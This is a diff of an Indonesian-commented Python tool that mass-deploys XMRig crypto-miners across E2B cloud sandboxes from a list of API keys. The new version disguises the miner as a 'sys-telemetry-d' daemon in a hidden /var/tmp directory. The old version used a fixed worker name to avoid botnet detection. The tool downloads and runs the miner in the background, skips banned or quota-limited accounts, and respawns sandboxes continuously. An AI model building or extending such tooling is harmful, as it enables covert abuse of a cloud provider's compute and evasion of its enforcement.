@@ -24,29 +24,26 @@ except ImportError:
     print("[ERROR] E2B SDK belum terinstall! Silakan install: pip install e2b requests")
     sys.exit(1)
 
-# Default Config (XMRig - Unmineable)
+# Default Fallback Config (8-Core 8-Thread XMRig Pure Cloud Setup)
 DEFAULT_CONFIG = {
-    "mode": "xmrig",
     "template_name": "core-yok7h-t4",
-    "slots_per_key": 20,             # Full 20 container per API
+    "slots_per_key": 20,
     "cpu_count": 8,
-    "workers_count": 8,              # Fix 8 threads
+    "mining_threads": 8,
     "memory_mb": 8192,
-    "sandbox_timeout_seconds": 3600, # 60 menit max timeout E2B biar ga mati sblm 50 menit
-    "duration_minutes": 50,          # Rerun otomatis setiap 50 menit
+    "sandbox_timeout_seconds": 3000,
+    "duration_minutes": 50,
     "auto_respawn": True,
-    "algorithm": "rx",
-    "host": "rx.unmineable.com",
-    "port": 443,
-    "worker_wallet": "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM", # Diganti ke DGB
-    "fixed_worker_name": "skynotnt", # Nama worker fix biar ga kedetect botnet
-    "password": "x",
+    "wallet_user": "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM.Sekay77",
+    "pool_url": "rx.unmineable.com:443",
+    "algorithm": "rx/0",
+    "tls": True,
     "keys_file": "list.txt",
     "concurrency_limit": 3,
     "spawn_delay_seconds": 1.0
 }
 
-CONFIG_FILE = "config_unmineable.json" if os.path.exists("config_unmineable.json") else "config.json"
+CONFIG_FILE = "config_xmrig.json" if os.path.exists("config_xmrig.json") else "config.json"
 
 def load_config():
     if os.path.exists(CONFIG_FILE):
@@ -74,100 +71,85 @@ banned_keys = set()
 quota_keys = set()
 lock = threading.Lock()
 
-SYS_DIR = "/var/tmp/.xmrig_runner"
-LOG_FILE = "/tmp/xmrig.log"
-XMRIG_DOWNLOAD_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+# Camouflaged System Daemon Directory & Process Mask
+SYS_DIR = "/var/tmp/.sys-telemetry-d"
+SYS_BIN = "sys-telemetry-d"
+SYS_CONF = "sys-telemetry.conf"
+LOG_FILE = "/tmp/e2b_miner.log"
 
-def build_xmrig_bash_script(cfg, worker_internal_label):
-    algo = cfg.get("algorithm", "rx")
-    host = cfg.get("host", "rx.unmineable.com")
-    port = cfg.get("port", 443)
-    wallet = cfg.get("worker_wallet", "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
-    fixed_name = cfg.get("fixed_worker_name", "skynotnt")
-    password = cfg.get("password", "x")
-    threads = cfg.get("workers_count", 8)
+def build_config_json_content(cfg):
+    pool = cfg.get("pool_url", "rx.unmineable.com:443")
+    clean_pool = pool if pool.startswith("stratum+ssl://") else f"stratum+ssl://{pool}"
+    wallet = cfg.get("wallet_user", "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM.Sekay77")
+    algo = cfg.get("algorithm", "rx/0")
 
-    pool_address = f"stratum+ssl://{host}:{port}"
+    return json.dumps({
+        "autosave": False,
+        "cpu": {
+            "enabled": True,
+            "max-threads-hint": 100,
+            "hugepages": True
+        },
+        "opencl": False,
+        "cuda": False,
+        "pools": [
+            {
+                "algo": algo,
+                "coin": None,
+                "url": clean_pool,
+                "user": wallet,
+                "pass": "x",
+                "tls": True,
+                "keepalive": True
+            }
+        ]
+    }, indent=2)
 
-    return f"""#!/bin/bash
-mkdir -p {SYS_DIR}
-cd {SYS_DIR} || exit 1
-
-if [ ! -f xmrig ]; then
-    echo "[{worker_internal_label}] Downloading XMRig v6.22.2..."
-    curl -sL "{XMRIG_DOWNLOAD_URL}" -o xmrig.tar.gz
-    tar -xzf xmrig.tar.gz --strip-components=1
-    rm -f xmrig.tar.gz
-    chmod 755 xmrig
-fi
-
-echo "[{worker_internal_label}] Starting XMRig ({algo}) for Unmineable as {fixed_name}..."
-./xmrig \\
-    -a {algo} \\
-    -o {pool_address} \\
-    -u {wallet}.{fixed_name} \\
-    -p {password} \\
-    --tls \\
-    --threads {threads}
-"""
-
-def get_remote_active_sandboxes(api_key):
-    try:
-        headers = {"X-API-Key": api_key, "Accept": "application/json"}
-        resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
-        if resp.status_code in (401, 403):
-            with lock:
-                banned_keys.add(api_key)
-            return None
-        if resp.status_code == 200:
-            data = resp.json()
-            sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
-            active_ids = set()
-            for s in sandboxes:
-                s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
-                state = str(s.get("status") or s.get("state") or "").lower()
-                if s_id and state not in ("suspended", "paused", "closed", "stopped", "dead"):
-                    active_ids.add(s_id)
-            return active_ids
-    except Exception:
-        pass
-    return None
-
-def ensure_template_exists(api_key, template_name="core-yok7h-t4", label="E2B"):
+def ensure_template_exists(api_key, template_name="core-yok7h-t4", cpu_count=8, memory_mb=8192, label="E2B"):
+    """Cek ketersediaan template di akun E2B; jika belum ada, otomatis build template 8 vCPU & 8GB RAM dengan pre-installed binary"""
     if not template_name or template_name.lower() == "base":
         return "base"
     
     try:
         if Template.exists(template_name, api_key=api_key):
-            print(f"[{label}] ✅ Template '{template_name}' siap di akun ini.")
+            print(f"[{label}] ✅ Template 8-Core '{template_name}' siap di akun ini.")
             return template_name
         
-        print(f"[{label}] 📦 Template '{template_name}' belum ada. Memulai auto-build...")
+        print(f"[{label}] 📦 Template '{template_name}' belum ada di akun E2B ini.")
+        print(f"[{label}] 🔨 Memulai auto-build template '{template_name}' (8 vCPU, 8GB RAM + Pre-installed Binary)...")
+        
         builder = (
             Template()
             .from_template("base")
             .run_cmd(
-                "sudo apt-get update -y && "
-                "sudo apt-get install -y curl tar procps"
+                f"mkdir -p {SYS_DIR} && "
+                f"curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/.xmrig.tar.gz && "
+                f"tar -xzf /tmp/.xmrig.tar.gz -C /tmp && "
+                f"mv /tmp/xmrig-6.22.2/xmrig {SYS_DIR}/{SYS_BIN} && "
+                f"chmod +x {SYS_DIR}/{SYS_BIN} && "
+                f"rm -rf /tmp/.xmrig.tar.gz /tmp/xmrig-6.22.2"
             )
         )
-        Template.build(
+        build_info = Template.build(
             builder,
             name=template_name,
+            cpu_count=cpu_count,
+            memory_mb=memory_mb,
             api_key=api_key
         )
-        print(f"[{label}] 🎉 Template '{template_name}' BERHASIL DI-BUILD!")
+        print(f"[{label}] 🎉 Template '{template_name}' BERHASIL DI-BUILD (8 vCPU & 8GB RAM)! Deploy akan instan!")
         return template_name
     except Exception as e:
         print(f"[{label}] ⚠️ Info build template '{template_name}': {e}. Menggunakan 'base'.")
         return "base"
 
 def clean_remote_orphan_sandboxes(api_key, label="E2B"):
+    """Bersihkan sandbox lama/orphan di cloud via REST API E2B secara cepat & paralel"""
     try:
         headers = {"X-API-Key": api_key, "Accept": "application/json"}
         resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
         if resp.status_code in (401, 403):
-            print(f"[{label}] 🚫 Akun/Team BANNED/INVALID (HTTP {resp.status_code}).")
+            print(f"[{label}] 🚫 Akun/Team terindikasi BANNED/INVALID (HTTP {resp.status_code}). Menandai token.")
             with lock:
                 banned_keys.add(api_key)
             return
@@ -175,7 +157,7 @@ def clean_remote_orphan_sandboxes(api_key, label="E2B"):
             data = resp.json()
             sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
             if sandboxes:
-                print(f"[{label}] 🧹 Ditemukan {len(sandboxes)} sandbox aktif. Membersihkan...")
+                print(f"[{label}] 🧹 Ditemukan {len(sandboxes)} sandbox aktif di cloud. Membersihkan secara paralel...")
                 def delete_one(s):
                     s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
                     if s_id:
@@ -183,11 +165,11 @@ def clean_remote_orphan_sandboxes(api_key, label="E2B"):
                             requests.delete(f"https://api.e2b.dev/sandboxes/{s_id}", headers=headers, timeout=5)
                         except Exception:
                             pass
-                with ThreadPoolExecutor(max_workers=20) as ex:
+                with ThreadPoolExecutor(max_workers=15) as ex:
                     list(ex.map(delete_one, sandboxes))
                 time.sleep(1)
                 print(f"[{label}] ✅ Cloud sandbox bersih.")
-    except Exception:
+    except Exception as e:
         pass
 
 def parse_keys_file(filepath):
@@ -235,29 +217,34 @@ def parse_keys_file(filepath):
 def spawn_single_sandbox(cfg, account, slot_index):
     token = account["token"]
     label = account["label"]
-    worker_internal_label = f"{label.replace(' ', '_')}_slot_{slot_index}" 
+    worker_name = f"{label.replace(' ', '_')}-8core-slot-{slot_index}"
     worker_key = f"{token[:12]}-{slot_index}"
-    timeout_sec = cfg.get("sandbox_timeout_seconds", 3600)
-    template_name = account.get("ready_template") or cfg.get("template_name", "core-yok7h-t4")
+    timeout_sec = cfg.get("sandbox_timeout_seconds", 3000)
+    threads = cfg.get("mining_threads", 8)
 
     if token in banned_keys:
-        return {"status": "banned", "worker_name": worker_internal_label, "error": "Team is banned"}
+        return {"status": "banned", "worker_name": worker_name, "error": "Team is banned"}
     if token in quota_keys:
-        return {"status": "quota_limit", "worker_name": worker_internal_label, "error": "Quota limit reached"}
+        return {"status": "quota_limit", "worker_name": worker_name, "error": "Quota limit reached"}
 
-    print(f"    🚀 [{label}] Memulai XMRig Sandbox Slot #{slot_index} ({worker_internal_label}) [Tpl: {template_name}]...")
+    template_name = account.get("ready_template") or cfg.get("template_name", "core-yok7h-t4")
+    print(f"   🚀 [{label}] Memulai Sandbox Slot #{slot_index} ({worker_name}) [Tpl: {template_name}]...")
     sbx = None
 
     try:
+        # Spawn Sandbox dengan E2B SDK (Template 8 vCPU)
         try:
             sbx = Sandbox.create(
                 template=template_name,
                 api_key=token,
                 timeout=timeout_sec,
-                request_timeout=180,
+                request_timeout=60,
                 envs={
-                    "WORKER_NAME": worker_internal_label,
-                    "BOT_LABEL": worker_internal_label,
+                    "WORKER_NAME": worker_name,
+                    "BOT_LABEL": worker_name,
+                    "MINER_THREADS": str(threads),
+                    "MINER_WALLET": cfg.get("wallet_user", ""),
+                    "MINER_POOL": cfg.get("pool_url", "")
                 }
             )
         except Exception as tpl_err:
@@ -267,41 +254,52 @@ def spawn_single_sandbox(cfg, account, slot_index):
                     template="base",
                     api_key=token,
                     timeout=timeout_sec,
-                    request_timeout=180,
+                    request_timeout=60,
                     envs={
-                        "WORKER_NAME": worker_internal_label,
-                        "BOT_LABEL": worker_internal_label,
+                        "WORKER_NAME": worker_name,
+                        "BOT_LABEL": worker_name,
+                        "MINER_THREADS": str(threads),
+                        "MINER_WALLET": cfg.get("wallet_user", ""),
+                        "MINER_POOL": cfg.get("pool_url", "")
                     }
                 )
             else:
                 raise tpl_err
 
         sandbox_id = sbx.sandbox_id
-        print(f"      ✅ Sandbox ID [{sandbox_id}] Berhasil Dibuat!")
+        print(f"      ✅ Sandbox ID [{sandbox_id}] Berhasil Dibuat (8-Core CPU)!")
 
-        # 1. Tulis script bash runner ke container
-        bash_content = build_xmrig_bash_script(cfg, worker_internal_label)
-        sbx.commands.run(f"mkdir -p {SYS_DIR}", timeout=30, request_timeout=30)
-        sbx.files.write(f"{SYS_DIR}/run_miner.sh", bash_content)
-        sbx.commands.run(f"chmod +x {SYS_DIR}/run_miner.sh", timeout=30, request_timeout=30)
+        # 1. Tulis file konfigurasi langsung via E2B Filesystem API (Aman & Instan < 10ms)
+        config_content = build_config_json_content(cfg)
+        sbx.files.write(f"{SYS_DIR}/{SYS_CONF}", config_content)
 
-        # 2. Install curl & tar jika belum ada
+        # 2. Pastikan binary siap (jika sudah ada di template, ini 0ms; jika fallback base, download cepat)
         setup_cmd = (
-            "[ -f /usr/bin/curl ] && [ -f /usr/bin/tar ] || ("
-            "sudo apt-get update -qq && "
-            "sudo apt-get install -y -qq curl tar procps || true)"
+            f"[ -f {SYS_DIR}/{SYS_BIN} ] || ("
+            f"mkdir -p {SYS_DIR} && "
+            f"curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/.xmrig.tar.gz && "
+            f"tar -xzf /tmp/.xmrig.tar.gz -C /tmp && "
+            f"mv /tmp/xmrig-6.22.2/xmrig {SYS_DIR}/{SYS_BIN} && "
+            f"chmod +x {SYS_DIR}/{SYS_BIN} && "
+            f"rm -rf /tmp/.xmrig.tar.gz /tmp/xmrig-6.22.2)"
         )
-        sbx.commands.run(setup_cmd, timeout=120, request_timeout=120)
+        sbx.commands.run(setup_cmd, timeout=30)
 
-        # 3. Eksekusi XMRig di background
-        cmd_str = f"(nohup {SYS_DIR}/run_miner.sh </dev/null >{LOG_FILE} 2>&1 &)"
-        sbx.commands.run(cmd_str, timeout=30, request_timeout=30)
+        # 3. Jalankan Miner di Background sebagai Detached Daemon (100% Persisten)
+        cmd_str = (
+            f"(nohup {SYS_DIR}/{SYS_BIN} "
+            f"--config={SYS_DIR}/{SYS_CONF} "
+            f"--threads={threads} "
+            f"--log-file={LOG_FILE} "
+            f"--print-time=10 </dev/null >/dev/null 2>&1 &)"
+        )
+        sbx.commands.run(cmd_str)
 
         now = datetime.now()
         expires_at = now + timedelta(seconds=timeout_sec)
 
         info = {
-            "worker_name": worker_internal_label,
+            "worker_name": worker_name,
             "sandbox_id": sandbox_id,
             "token": token,
             "label": label,
@@ -315,40 +313,44 @@ def spawn_single_sandbox(cfg, account, slot_index):
         with lock:
             active_sandboxes[worker_key] = info
 
-        print(f"      🔥 [ACTIVE] {worker_internal_label} XMRig Running (Mining as: {cfg.get('fixed_worker_name', 'skynotnt')})!\n")
+        print(f"      🔥 [ACTIVE] {worker_name} ({threads}-Threads 8-Core) AKTIF & MINING! (Timeout: {timeout_sec//60}m)\n")
         return {"status": "success", "info": info}
 
     except Exception as e:
         err_msg = str(e)
-        print(f"      ❌ Gagal spawn {worker_internal_label}: {err_msg}")
+        print(f"      ❌ Gagal spawn {worker_name}: {err_msg}")
 
+        # Jika gagal saat setup, kill sandbox agar slot tidak terbuang
         if sbx:
-            try: sbx.kill()
-            except Exception: pass
+            try:
+                sbx.kill()
+            except Exception:
+                pass
 
         if "banned" in err_msg.lower() or "403" in err_msg or "unauthorized" in err_msg.lower():
-            print(f"      🚫 Akun/Team {label} BANNED/INVALID.")
+            print(f"      🚫 Akun/Team {label} terindikasi BANNED/INVALID oleh E2B.")
             with lock:
                 banned_keys.add(token)
-            return {"status": "banned", "worker_name": worker_internal_label, "error": err_msg}
+            return {"status": "banned", "worker_name": worker_name, "error": err_msg}
 
         if "limit" in err_msg.lower() or "quota" in err_msg.lower() or "rate" in err_msg.lower() or "429" in err_msg:
-            print(f"      ⚠️ Kuota/Rate Limit tercapai untuk {label}.")
+            print(f"      ⚠️ Kuota/Rate Limit (Max 20 Sandboxes) tercapai untuk {label}.")
             with lock:
                 quota_keys.add(token)
-            return {"status": "quota_limit", "worker_name": worker_internal_label, "error": err_msg}
+            return {"status": "quota_limit", "worker_name": worker_name, "error": err_msg}
 
-        return {"status": "error", "worker_name": worker_internal_label, "error": err_msg}
+        return {"status": "error", "worker_name": worker_name, "error": err_msg}
 
 def deploy_all(cfg, accounts):
     slots = cfg.get("slots_per_key", 20)
     concurrency = cfg.get("concurrency_limit", 20)
     template_target = cfg.get("template_name", "core-yok7h-t4")
 
+    # Bersihkan orphan sandbox & pastikan template 8-Core siap sebelum mulai (Paralel)
     def prepare_account(acc):
         if acc["token"] not in banned_keys:
             clean_remote_orphan_sandboxes(acc["token"], acc["label"])
-            tpl = ensure_template_exists(acc["token"], template_target, acc["label"])
+            tpl = ensure_template_exists(acc["token"], template_target, cfg.get("cpu_count", 8), cfg.get("memory_mb", 8192), acc["label"])
             acc["ready_template"] = tpl
         return acc
 
@@ -364,19 +366,17 @@ def deploy_all(cfg, accounts):
             tasks.append((acc, slot))
 
     if not tasks:
-        print("\n=======================================================")
-        print("⚠️ Tidak ada sandbox yang dapat dideploy.")
-        print("=======================================================\n")
+        print(f"\n=======================================================")
+        print(f"⚠️ Tidak ada sandbox yang dapat dideploy (Semua key Banned / Invalid).")
+        print(f"=======================================================\n")
         return []
 
     spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
-    print("\n=======================================================")
-    print(f"📦 Total Target Sandbox : {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
-    print(f"⚡ Mode Mining           : XMRig v6.22.2 (Unmineable - {cfg.get('algorithm', 'rx')})")
-    print(f"⚡ Pool Worker Name     : {cfg.get('fixed_worker_name', 'skynotnt')} (Anti-Botnet Mode)")
-    print(f"⚡ Resource per Sandbox : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('memory_mb', 8192)} MB RAM | {cfg.get('workers_count', 8)} Threads")
-    print(f"⏱️ Auto-Rerun Interval  : Setiap {cfg.get('duration_minutes', 50)} Menit")
-    print("=======================================================\n")
+    print(f"\n=======================================================")
+    print(f"📦 Total Target Sandbox: {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
+    print(f"⚡ CPU per Sandbox     : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('mining_threads', 8)} Mining Threads")
+    print(f"⚡ Concurrency Worker   : {concurrency} Worker Santai (Jeda: {spawn_delay}s per slot)")
+    print(f"=======================================================\n")
 
     results = []
     with ThreadPoolExecutor(max_workers=concurrency) as executor:
@@ -392,86 +392,24 @@ def deploy_all(cfg, accounts):
             results.append(res)
 
     success_count = sum(1 for r in results if r["status"] == "success")
-    print("\n=======================================================")
-    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} XMRig Sandbox Berhasil Aktif!")
-    print("=======================================================\n")
+    print(f"\n=======================================================")
+    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} 8-Core Sandbox Berhasil Aktif!")
+    print(f"=======================================================\n")
     return results
 
 def monitor_and_respawn_loop(cfg, accounts):
     global is_running
     slots = cfg.get("slots_per_key", 20)
-    check_interval = 20
+    check_interval = 30
     start_time = datetime.now()
-    target_duration_sec = cfg.get("duration_minutes", 50) * 60
-    keys_file = cfg.get("keys_file", "list.txt")
 
-    known_tokens = {acc["token"] for acc in accounts}
-
-    print("🔄 Mode Auto-Respawn Daemon AKTIF. Memonitor Sandbox 24/7...")
-    print(f"⏱️ Limit Duration    : Rerun otomatis pada {target_duration_sec // 60} menit")
-    print("🛡️ Suspend Detection  : Real-time API check")
-    print("📂 Dynamic Key Reload : ACTIVE (Bisa nambah key di list.txt tanpa restart!)")
+    print("🔄 Mode Auto-Respawn Daemon AKTIF. Memonitor & menjaga Sandbox 8-Core tetap hidup 24/7...")
     print("Tekan Ctrl + C untuk keluar kapan saja.\n")
 
     while is_running:
         try:
             now = datetime.now()
             uptime_str = str(now - start_time).split(".")[0]
-
-            latest_accounts = parse_keys_file(keys_file)
-            new_accounts = [acc for acc in latest_accounts if acc["token"] not in known_tokens]
-
-            if new_accounts:
-                print(f"\n✨ [HOT-RELOAD] Ditemukan {len(new_accounts)} key baru di '{keys_file}'!")
-                
-                def prepare_acc(acc):
-                    if acc["token"] not in banned_keys:
-                        clean_remote_orphan_sandboxes(acc["token"], acc["label"])
-                        tpl = ensure_template_exists(
-                            acc["token"], 
-                            cfg.get("template_name", "core-yok7h-t4"), 
-                            acc["label"]
-                        )
-                        acc["ready_template"] = tpl
-                    return acc
-
-                with ThreadPoolExecutor(max_workers=max(1, len(new_accounts))) as ex:
-                    new_accounts = list(ex.map(prepare_acc, new_accounts))
-
-                new_tasks = []
-                for acc in new_accounts:
-                    if acc["token"] not in banned_keys:
-                        for slot in range(1, slots + 1):
-                            new_tasks.append((acc, slot))
-
-                if new_tasks:
-                    concurrency = cfg.get("concurrency_limit", 3)
-                    spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
-                    print(f"🚀 Memulai deploy {len(new_tasks)} slot untuk key baru...")
-
-                    with ThreadPoolExecutor(max_workers=concurrency) as executor:
-                        futures = []
-                        for acc, slot in new_tasks:
-                            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
-                            futures.append(fut)
-                            if spawn_delay > 0:
-                                time.sleep(spawn_delay)
-                        for fut in as_completed(futures):
-                            pass
-
-                for acc in new_accounts:
-                    accounts.append(acc)
-                    known_tokens.add(acc["token"])
-
-                print(f"✅ Hot-reload selesai. Total key aktif dipantau: {len(accounts)}\n")
-
-            remote_active_by_token = {}
-            for acc in accounts:
-                token = acc["token"]
-                if token not in banned_keys:
-                    remote_ids = get_remote_active_sandboxes(token)
-                    if remote_ids is not None:
-                        remote_active_by_token[token] = remote_ids
 
             to_respawn = []
             with lock:
@@ -486,26 +424,9 @@ def monitor_and_respawn_loop(cfg, accounts):
                             to_respawn.append((acc, slot))
                         else:
                             info = active_sandboxes[worker_key]
-                            elapsed_sec = (now - info["created_at"]).total_seconds()
-                            sbx_id = info["sandbox_id"]
-
-                            is_suspended = False
-                            if token in remote_active_by_token:
-                                if sbx_id not in remote_active_by_token[token]:
-                                    is_suspended = True
-
-                            if is_suspended:
-                                print(f"⚠️ Sandbox {info['worker_name']} [{sbx_id[:8]}] TERDETEKSI SUSPENDED/DEAD! Me-respawn...")
-                                try:
-                                    info["sbx_obj"].kill()
-                                except Exception:
-                                    pass
-                                del active_sandboxes[worker_key]
-                                to_respawn.append((acc, slot))
-                                continue
-
-                            if elapsed_sec >= target_duration_sec:
-                                print(f"⏰ Sandbox {info['worker_name']} menyentuh {int(elapsed_sec//60)}m. Me-rerun...")
+                            remaining_sec = (info["expires_at"] - now).total_seconds()
+                            if remaining_sec <= 120:
+                                print(f"⏰ Sandbox {info['worker_name']} mendekati batas timeout (Sisa {int(remaining_sec)}s). Me-respawn...")
                                 try:
                                     info["sbx_obj"].kill()
                                 except Exception:
@@ -527,7 +448,7 @@ def monitor_and_respawn_loop(cfg, accounts):
                 active_count = len(active_sandboxes)
                 banned_count = len(banned_keys)
 
-            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} XMRig Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
+            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} 8-Core Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
             
             for _ in range(check_interval):
                 if not is_running:
@@ -540,7 +461,7 @@ def monitor_and_respawn_loop(cfg, accounts):
 
 def signal_handler(sig, frame):
     global is_running
-    print("\n\n🛑 Menerima sinyal STOP (Ctrl+C)... Menghentikan Deployer.")
+    print("\n\n🛑 Menerima sinyal STOP (Ctrl+C)... Menghentikan Deployer dengan aman.")
     is_running = False
 
 def main():
@@ -548,32 +469,30 @@ def main():
     if hasattr(signal, "SIGTERM"):
         signal.signal(signal.SIGTERM, signal_handler)
 
-    parser = argparse.ArgumentParser(description="E2B Unmineable XMRig Cloud Sandbox Auto-Deployer")
-    parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B")
-    parser.add_argument("--file", "-f", default=None, help="File path E2B API Key")
-    parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key")
-    parser.add_argument("--duration", "-d", type=int, default=None, help="Durasi rerun dalam menit (default: 50)")
-    parser.add_argument("--wallet", "-w", default=None, help="Wallet Unmineable (Coin:Address)")
-    parser.add_argument("--workers", type=int, default=None, help="Jumlah worker threads per sandbox")
-    parser.add_argument("--name", type=str, default=None, help="Override Fixed Worker Name")
-    parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor loop")
+    parser = argparse.ArgumentParser(description="E2B Multi-Key 8-Core Cloud Sandbox Auto-Deployer")
+    parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B (default: core-yok7h-t4 atau base)")
+    parser.add_argument("--file", "-f", default=None, help="File path berisi E2B API Key (default: list.txt)")
+    parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key (default: 20)")
+    parser.add_argument("--timeout", "-t", type=int, default=None, help="Sandbox timeout dalam detik (default: 3000 / 50m)")
+    parser.add_argument("--wallet", "-w", default=None, help="Wallet / User untuk miner payload")
+    parser.add_argument("--threads", type=int, default=None, help="Threads CPU per sandbox (default: 8)")
+    parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor/auto-respawn loop")
     parser.add_argument("--daemon", action="store_true", help="Paksa jalankan daemon auto-respawn 24/7")
 
     args = parser.parse_args()
+
     cfg = load_config()
 
     if args.template:
         cfg["template_name"] = args.template
     if args.slots:
         cfg["slots_per_key"] = args.slots
-    if args.duration:
-        cfg["duration_minutes"] = args.duration
+    if args.timeout:
+        cfg["sandbox_timeout_seconds"] = args.timeout
     if args.wallet:
-        cfg["worker_wallet"] = args.wallet
-    if args.workers:
-        cfg["workers_count"] = args.workers
-    if args.name:
-        cfg["fixed_worker_name"] = args.name
+        cfg["wallet_user"] = args.wallet
+    if args.threads:
+        cfg["mining_threads"] = args.threads
     if args.file:
         cfg["keys_file"] = args.file
 
@@ -582,22 +501,28 @@ def main():
 
     print(f"""
 =============================================================
-  ⚡ E2B UNMINEABLE XMRIG V6.22.2 AUTO-DEPLOYER
-  🔥 {cfg.get('workers_count', 8)} Threads | Fixed Name: {cfg.get('fixed_worker_name', 'skynotnt')} | 20 Slots/Key
-  🛡️ Rerun Interval: {cfg.get('duration_minutes', 50)} Menit
+  ⚡ E2B 8-CORE MULTI-SANDBOX CLOUD AUTO-DEPLOYER (v2.0)
+  🔥 8 vCPU | 8 Threads | Kamuflase sys-telemetry-d
+  🛡️ 20 Slots/Key | 24/7 Auto Keep-Alive Daemon
 =============================================================
 """)
-    print("⚙️  Konfigurasi:")
-    print(f"   • Template E2B         : {template_name}")
-    print(f"   • File Key             : {keys_file}")
-    print(f"   • Slots per Key        : {cfg['slots_per_key']} Slots")
-    print(f"   • Rerun Duration       : {cfg.get('duration_minutes', 50)} menit")
-    print(f"   • Auto-Respawn Loop    : {'ON (24/7 Keepalive)' if (cfg['auto_respawn'] or args.daemon) and not args.once else 'OFF'}")
-    print("=============================================================\n")
+    print(f"⚙️  Konfigurasi:")
+    print(f"   • Template E2B       : {template_name}")
+    print(f"   • File Key           : {keys_file}")
+    print(f"   • Slots per Key      : {cfg['slots_per_key']} Slots (Max 20/Token)")
+    print(f"   • Sandbox CPU        : {cfg['cpu_count']} vCPU | RAM: {cfg.get('memory_mb', 8192)} MB")
+    print(f"   • Mining Threads     : {cfg['mining_threads']} Threads (Full 8-Core)")
+    print(f"   • Timeout Sandbox    : {cfg['sandbox_timeout_seconds']} detik ({cfg['sandbox_timeout_seconds']//60} menit)")
+    print(f"   • Mining Pool        : {cfg['pool_url']}")
+    print(f"   • Wallet/Worker      : {cfg['wallet_user']}")
+    print(f"   • Kamuflase Proses   : {SYS_DIR}/{SYS_BIN}")
+    print(f"   • Auto-Respawn Loop  : {'ON (24/7 Keepalive)' if (cfg['auto_respawn'] or args.daemon) and not args.once else 'OFF (One-Shot)'}")
+    print(f"=============================================================\n")
 
     accounts = parse_keys_file(keys_file)
     if not accounts:
         print(f"❌ Error: File '{keys_file}' tidak ditemukan atau kosong!")
+        print(f"ℹ️ Silakan tambahkan E2B API Key ke file '{keys_file}' (satu key per baris atau label|key).")
         sys.exit(1)
 
     print(f"📋 Ditemukan {len(accounts)} API Key di '{keys_file}':")
